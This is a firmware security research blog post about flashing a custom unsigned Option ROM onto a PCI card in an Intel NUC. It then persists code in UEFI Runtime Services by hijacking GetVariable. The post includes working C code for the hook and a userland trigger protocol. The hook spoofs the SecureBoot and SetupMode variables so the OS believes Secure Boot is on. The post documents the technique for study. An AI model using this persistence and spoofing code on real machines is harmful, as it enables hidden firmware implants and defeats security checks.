---
title: "Executing custom Option ROM on D34010WYK and persisting code in UEFI Runtime Services"
created: 2020-01-04
tags: 
  - uefi
  - firmware
  - secure-boot
---

In this post we’ll explore running unsigned Option ROM code on an Intel D34010WYK NUC, solely for testing purposes. We will verify that unsigned/unverified Option ROM code is not run when UEFI Secure Boot is enabled. We will demonstrate how to persist code at runtime using UEFI Runtime Services, and use a small signalling protocol to allow an unprivileged userland process to fake the contents of UEFI variables such as the SecureBoot variable.

<!--more-->

This is a continuation of a previous post, [Using an Option ROM to overwrite SMI handlers in QEMU](https://casualhacking.io/blog/2019/12/3/using-optionrom-to-overwrite-smmsmi-handlers-in-qemu). Please review the content and the referenced source materials as well as the following source materials for additional context:

- [Microsoft’s UEFI Validation Option ROM Guidance](https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/uefi-validation-option-rom-validation-guidance)
- [Open Security Training’s PCI Option/Expansion ROMs](http://opensecuritytraining.info/IntroBIOS_files/Day1_06_Advanced%20x86%20-%20BIOS%20and%20SMM%20Internals%20-%20PCI%20XROMs.pptx)

The code and examples in this post, which are run on bare metal UEFI platforms, assume UEFI Secure Boot is disabled. If a UEFI production BIOS implements Secure Boot correctly then unsigned/unverified Option ROMs should not execute. Note that in the previous post the OVMF platform run in QEMU disables verification for Option ROMs by setting `PcdOptionRomImageVerificationPolicy|0x0`.

## Create a toy Option ROM using the EDKII

In the previous post we used a modified iPXE as a starting point for our Option ROM code. This time we will use the EDK. For example, create a new folder and file called `MyOptionRom` within the EDKII source tree with the following code:

```c
EFI_STATUS
EFIAPI
MyOptionRomEntry (
  IN  EFI_HANDLE        ImageHandle,
  IN  EFI_SYSTEM_TABLE  *SystemTable
  )
{
    (void)ImageHandle;
    (void)SystemTable;

    DEBUG((EFI_D_INFO, "MyOptionRom loaded\n"));
    Print(L"MyOptionRom loaded\n");

    return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
MyOptionRomUnload (
  IN  EFI_HANDLE  ImageHandle
  )
{
    (void)ImageHandle;
    return EFI_SUCCESS;
}
```

The above skeleton code is printing a trace to the debug console and any `ConOut` configured. This is helpful in combination with the UEFI Shell’s `loadpcirom` command. Use this command before flashing Option ROM code to test that it does not halt/fault the system. ;)

Next, add the INF to `OvmfPkg/OvmfPkgIa32X64.dsc`’s `[Components.X64]` section to build; and finally, use the `EfiRom` tool to create an EFI-type Option ROM.

```sh
$ ./BaseTools/Source/C/bin/EfiRom \
  -f 0x$VENDOR -i 0x$PRODUCT -v --debug 9 \
  -o ./Build/MyOptionRom.efirom \
  -e ./Build/Ovmf3264/DEBUG_GCC5/X64/MyOptionRom.efi
```

## Run an Option ROM on an Intel NUC

In this example I wanted to write Option ROM code to a PCI card and run it on bare metal. I do not have many bare metal machines beyond a gaming desktop and an outdated [D34010WYK](assets/D54250WYB_D34010WYB_TechProdSpec.pdf) NUC (thus the rational for using the NUC). Unfortunately, the NUC's onboard Video Card and NIC do not have writeable Option ROM storage, the PCI devices are as follows:

```sh
$ lspci -n
00:00.0 0600: 8086:0a04 (rev 09)
00:02.0 0300: 8086:0a16 (rev 09)
00:03.0 0403: 8086:0a0c (rev 09)
00:14.0 0c03: 8086:9c31 (rev 04)
00:16.0 0780: 8086:9c3a (rev 04)
00:19.0 0200: 8086:1559 (rev 04)
00:1b.0 0403: 8086:9c20 (rev 04)
00:1d.0 0c03: 8086:9c26 (rev 04)
00:1f.0 0601: 8086:9c43 (rev 04)
00:1f.2 0106: 8086:9c03 (rev 04)
00:1f.3 0c05: 8086:9c22 (rev 04)
```

The 8086:1559 Intel NIC does not support upgradable firmware or storage for an Option ROM. Though I tired with Intel’s [Intel(R) Ethernet Flash Firmware Utility](https://downloadcenter.intel.com/download/29137?v=t) just in case. For others wanting to test, the utility's `bootutil64e` is able to write Option ROM to support PXE loading on several NIC devices.

The 8086:0a16 Intel Video Card uses a virtual Option ROM. These are stored with the UEFI platform code and loaded into memory from the system’s flash storage. The Option ROM code is not stored on the PCI onboard storage.

This means out of the box there are no R/W Option ROM on any of the PCI devices on the D34010WYK.

There is still hope for testing Option ROM as the D34010WYK NUC has has two expandable mPCI-E slots. I am not aware of off-the-shelf or purchasable debug mPCI wifi/bluetooth cards having expansion ROMs but we can use a [mPCI-E to PCI-E 1x adapter](https://www.amazon.com/Mini-Express-Extension-Adapter-Riser/dp/B01FVPITN8) and a [Broadcom BCM5751 PCI-E 1x NIC](https://www.amazon.com/TOTOVIN-Broadcom-NetXtreme-1000Mbps-Gigabit/dp/B076HHS1WF/). If you have a 5th generation (or other) NUC you may be able to [take a similar approach](https://www.virten.net/2015/09/adding-a-second-nic-to-a-5th-gen-intel-nuc-or-other-pcie-cards/) with a M.2 to PCI-E adapter.

```sh
$ lspci -v
[...]
02:00.0 0200: 14e4:1677 (rev 20)
	Subsystem: 14e4:1677
	Flags: bus master, fast devsel, latency 0, IRQ 51
	Memory at f7c10000 (64-bit, non-prefetchable) [size=64K]
	Expansion ROM at f7c00000 [disabled] [size=64K]
	Capabilities: 
	Kernel driver in use: tg3
	Kernel modules: tg3
```

Putting these together looks a little hackey, but thankfully the card does not need an additional 12V:

![D34010WYK NUC with mPCI-E to PCI-E 1x adapter and Broadcom BCM5751 (14e4:1677)](/assets/images/nuc-with-pcie-broadcom.png)

D34010WYK NUC with mPCI-E to PCI-E 1x adapter and Broadcom BCM5751 (14e4:1677)

The BCM5751's 64kB flash can be safely written using [Broadcom's B57udiag tool](https://docs.broadcom.com/docs/12358473), for example following [iPXE's burning guide](https://ipxe.org/howto/romburning/tg3). It may be possible to write your Option ROM using `ethtool` but not safely so be careful.

Heads up, the Option ROM output from `EfiRom`, like the XROMs in the previous post, are type EFI (0x3) and the NUC platform code will only run these if CSM is disabled. I searched the Setup's IFR and saw options, "Launch PXE OpROM Policy", "Launch Storage OpROM Policy" and similar that allowed running EFI-type XROMs in CSM mode. But these are not available in the Setup UI.

Additionally, I could not find a way to disable loading Option ROMs through Setup configuration. But when UEFI Secure Boot is enabled any unsigned/unverified Option ROMs will not load (this is great!).

We can see that our Option ROM is loaded and measured by observing changes to the TPM's PCR 2. The base comparison is using a BIOS version WYLPT10H.86A.0054.2019.0902.1752.

```sh
$ sudo tpm2_pcrlist
sha1 :
  0  : 0xCEAE0E6DC5A21B75D58171961D315E96326178D3 // Platform
  1  : 0x48A8708AC544F8411A9D5FF114A4E51E7A4C1041 // Platform Config
  2  : 0x9676BCB349D9D31493B52CA6007CB3706334798E // Option ROM Code
  3  : 0xB2A83B0EBF2F8374299A5B2BDFC31EA955AD7236 // Option ROM Config+Data
  4  : 0x9542780BC3517B84298563A2EF280139DF33B915 // IPL Code
  5  : 0xBFC7CE73BC3595FBC323F2B4EE1B56B86947ED23 // IPL Config+Datsa
  6  : 0xB2A83B0EBF2F8374299A5B2BDFC31EA955AD7236
  7  : 0xF97A28075F83A5474515E50F2A504C6E271533D3
[...]
  9  : 0xA78714D017777270C295B446A12A7FC5961D3167
[...]
```

And diffing before and after overwriting the Option ROM shows that PCR 2 measures the new code.

```sh
$ diff before-xrom after-xrom
<   2 : 0x9676BCB349D9D31493B52CA6007CB3706334798E
---
>   2 : 0x257C9F0CDA97A0CCEB6F3B7CE92F8BD51F589387
```

## Communicating with userland using UEFI Runtime Services

Now that we have our toy Option ROM running on the NUC with Secure Boot disabled, what can we do? In the previous post we relaxed security of the OVMF platform by allowing our Option ROM to run before `EndOfDXE` and persisting in SMM; we cannot do that with the NUC's production UEFI so we instead turn to UEFI Runtime Services to persist code.

The goals are as follows:

- Use the Option ROM to persist code in UEFI Runtime Services
- Allow an unprivileged userland process to communicate with our code
- Do something interesting that has security impact

Keep in mind that a malicious Option ROM can do much more than persist code, for example it can overwrite content on attached storage.

My solution is again to trampoline the code that retrieves UEFI variables. An unprivileged process can attempt a read of a variable and this attempt will call the Runtime Services [`GetVariable`](https://edk2-docs.gitbooks.io/edk-ii-uefi-driver-writer-s-guide/5_uefi_services/52_services_that_uefi_drivers_rarely_use/525_getvariable_and_setvariable.html) API.

Consider the following code as part of the implementation of our Option ROM entry point:

```c
EFI_BOOT_SERVICES *gBS = NULL;
gBS = SystemTable->BootServices
VOID *handler = NULL;
gBS->AllocatePool(EfiRuntimeServicesCode, 0x1000, &handler);
If (handler != NULL) {
  // Move our Option ROM code into RT_CODE
  gBS->CopyMem((void*)handler, HijackedGetVariable, 0x1000);

  // TODO: Save gRT->GetVariable

  // gRT is the Runtime Services table
  gRT->GetVariable = handler;
}
```

The `HijackedGetVariable` handler will trampoline into the original `GetVariable`; and code in the `EfiRuntimeServicesCode` map will be relocated for us by the OS. Saving the existing `GetVariable` location is a bit more challenging. In the previous post the SMI trampoline was easy as the SMM dispatcher supported falling back to a backup handler so no state was maintained within our code.

The state maintenance referenced above is also needed to implement communication with our code and userspace.

For context, an unprivileged user cannot read an arbitrary UEFI variable, but rather only the variables exposed by the sysfs `efivars` filesystem. To communicate with our code, we have to invent a hacky protocol involving reading well-known variable names in sequence, sort of a variable-read side-channel. This protocol requires maintaining state between variable reads.

To maintain state we will reserve a region in RT\_DATA and overwrite part of `HijackedGetVariable` with the location of reserved memory. We will overwrite a canary value such that the trampolined logic becomes:

```c
EFI_STATUS
EFIAPI
HijackedGetVariable(
  IN     CHAR16                      *VariableName,
  IN     EFI_GUID                    *VendorGuid,
  OUT    UINT32                      *Attributes,    OPTIONAL
  IN OUT UINTN                       *DataSize,
  OUT    VOID                        *Data           OPTIONAL
  )
{
  // Our canary value
  UINT64 replace_me = 0xab12ab12;
  // Expect the canary to be overwritten in GetVariable install
  if (replace_me == 0x0 || replace_me == 0xab12ab12) {
    // We could not find the data
    return (EFI_STATUS)0x3;
  }

  MyOptionRomData *data = (MyOptionRomData*)replace_me;
  // Use data, for example count the number of times VariableName was requested
  [...]

  // Fall through to the original GetVariable
  UINT32 DupAttributes = 0;
  UINTN DupDataSize = *DataSize;
  Status = data->GetVariable(
    VariableName,
    VendorGuid,
    &DupAttributes,
    &DupDataSize,
    Data
  );
  if (Attributes != NULL) {
    *Attributes = DupAttributes;
  }
  *DataSize = DupDataSize;
  return Status;
}
```

The `GetVariable` install code is then modified to allocate the Runtime Services data and fixup the relocated code with the position of this data structure.

```c
// Fill in the above TODO with:
MyOptionRomData *data = NULL;
gBS->AllocatePool(EfiRuntimeServicesData, sizeof(MyOptionRomData), (VOID**)&data);
If (data == NULL) {
  // Handle unlikely error state
}

unsigned char *search = (unsigned char *)handler
for (INTN i = 0; i < 100; i++) {
  // Search for canary value
  if (search[i] == 0x12 && search[i+1] == 0xab && 
      search[i+2] == 0x12 && search[i+3] == 0xab) {
    search[i] = ((unsigned char *)(&data))[0];
    search[i+1] = ((unsigned char *)(&data))[1];
    search[i+2] = ((unsigned char *)(&data))[2];
    search[i+3] = ((unsigned char *)(&data))[3];
    break;
  }
}

// Remember the original GetVariable location
data->GetVariable = gRT->GetVariable;
```

Now imagine adding several counters to `MyOptionRomData` and implementing two states. The first is triggered by reading `BootCurrent` ten times consecutively and this disables or enables `GetVariable` functionality; the second is triggered by reading `Boot0002` and overrides the return of `SecureBoot` to return `0x1` or allow the code to fall through into the trampoline.

Thus we can introduce simple security impact with this trampoline by faking / masking any `GetVariable` request, for example tricking the OS that it is running in UEFI Secure Boot mode.

Below is another toy example testing the state maintainace to on-command trigger disabling `GetVariable` functionality.

```sh
[fedora@localhost ~]$ hexdump -C /sys/firmware/efi/efivars/BIOSVer-78f1f0c7-c017-4712-ba1d-70e823b11df8 
00000000  07 00 00 00 36 00                                 |....6.|
00000006
[fedora@localhost ~]$ ./getvariable_call --test
Reading /sys/firmware/efi/efivars/BootCurrent-8be4df61-93ca-11d2-aa0d-00e098032b8c
Reading /sys/firmware/efi/efivars/BootCurrent-8be4df61-93ca-11d2-aa0d-00e098032b8c
Reading /sys/firmware/efi/efivars/BootCurrent-8be4df61-93ca-11d2-aa0d-00e098032b8c
Reading /sys/firmware/efi/efivars/BootCurrent-8be4df61-93ca-11d2-aa0d-00e098032b8c
Reading /sys/firmware/efi/efivars/BootCurrent-8be4df61-93ca-11d2-aa0d-00e098032b8c
Reading /sys/firmware/efi/efivars/BootCurrent-8be4df61-93ca-11d2-aa0d-00e098032b8c
Reading /sys/firmware/efi/efivars/BootCurrent-8be4df61-93ca-11d2-aa0d-00e098032b8c
Reading /sys/firmware/efi/efivars/BootCurrent-8be4df61-93ca-11d2-aa0d-00e098032b8c
Reading /sys/firmware/efi/efivars/BootCurrent-8be4df61-93ca-11d2-aa0d-00e098032b8c
Reading /sys/firmware/efi/efivars/BootCurrent-8be4df61-93ca-11d2-aa0d-00e098032b8c
Now try to read any variable in /sys/firmware/efi/efivars/
[fedora@localhost ~]$ hexdump -C /sys/firmware/efi/efivars/BIOSVer-78f1f0c7-c017-4712-ba1d-70e823b11df8 
00000000  00 00 00 00                                       |....|
00000004
```

And finally to "spoof" that Secure Boot is enabled when it is not we return `0x1` for `SecureBoot` and `0x0` for `SetupMode` with the code below, note that this does not yet work for Windows (only tested on Fedora).

```c
  [...]
  // Fall through to the original GetVariable
  UINT32 DupAttributes = 0;
  UINTN DupDataSize = *DataSize;
  Status = data->GetVariable(
    VariableName,
    VendorGuid,
    &DupAttributes,
    &DupDataSize,
    Data
  );
  if (Attributes != NULL) {
    *Attributes = DupAttributes;
  }
  *DataSize = DupDataSize;

  CHAR8* DataArr = (CHAR8*)Data;
  if (VariableName != NULL && 
      VariableName[0] == 'S' && 
      VariableName[1] == 'e' && 
      VariableName[2] == 'c' && 
      VariableName[3] == 'u') {
    // Turn on SecureBoot
    DataArr[0] = 0x1;
    *DataSize = 1;
    Status = EFI_SUCCESS;
  }

  if (VariableName != NULL && 
      VariableName[0] == 'S' && 
      VariableName[1] == 'e' && 
      VariableName[2] == 't' && 
      VariableName[3] == 'u') {
    // Turn off SetupMode
    DataArr[0] = 0x0;
    *DataSize = 1;
    Status = EFI_SUCCESS;
  }

  return Status;
}
```
